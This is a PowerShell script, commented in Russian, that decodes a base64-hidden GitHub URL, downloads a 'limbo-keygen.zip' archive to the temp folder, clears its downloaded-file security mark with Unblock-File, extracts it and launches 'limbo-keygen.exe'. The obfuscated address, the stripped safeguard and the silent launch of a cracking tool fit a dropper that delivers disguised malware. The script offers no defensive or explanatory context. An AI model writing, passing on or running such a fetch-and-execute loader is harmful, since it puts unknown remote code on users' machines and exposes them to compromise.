$base64Url = "aHR0cHM6Ly9naXRodWIuY29tL3dkYXNkYXNkd2FkYXcvbC9yYXcvcmVmcy9oZWFkcy9tYWluL2xpbWJvLWtleWdlbi56aXA="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Url))
$zipPath = "$env:TEMP\limbo-keygen.zip"
$extractPath = "$env:TEMP\LimboExtracted"

# 1. Скачиваем ZIP-архив
(New-Object System.Net.WebClient).DownloadFile($url, $zipPath)
Unblock-File $zipPath

# 2. Распаковываем архив
if (Test-Path $extractPath) { Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue }
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# 3. Ищем и запускаем limbo-keygen.exe
$exePath = Get-ChildItem -Path $extractPath -Filter "limbo-keygen.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
if ($exePath) {
    Start-Process -FilePath $exePath
} else {
    # Если файл не найден, выводим ошибку (или просто закрываемся)
    Write-Host "File not found"
}